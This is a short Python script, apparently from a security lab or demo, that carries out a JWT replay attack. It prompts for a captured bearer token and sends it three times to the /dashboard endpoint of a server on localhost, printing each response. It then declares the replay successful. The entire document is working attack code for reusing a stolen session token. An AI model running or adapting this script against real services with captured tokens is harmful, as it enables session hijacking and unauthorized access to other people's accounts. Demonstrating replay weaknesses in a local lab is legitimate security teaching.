import requests
import time
import json

TARGET = "http://127.0.0.1:5000"

TOKEN = input("Enter captured JWT: ")

headers = {
    "Authorization": f"Bearer {TOKEN}"
}

print("\n[*] Starting replay attack...\n")

for i in range(3):
    print(f"[*] Replay Attempt #{i+1}")

    r = requests.get(
        f"{TARGET}/dashboard",
        headers=headers
    )

    print(f"[+] HTTP {r.status_code}")

    try:
        print(json.dumps(r.json(), indent=2))
    except:
        print(r.text)

    print()

    time.sleep(2)

print("[!] Replay successful — same token reused multiple times")
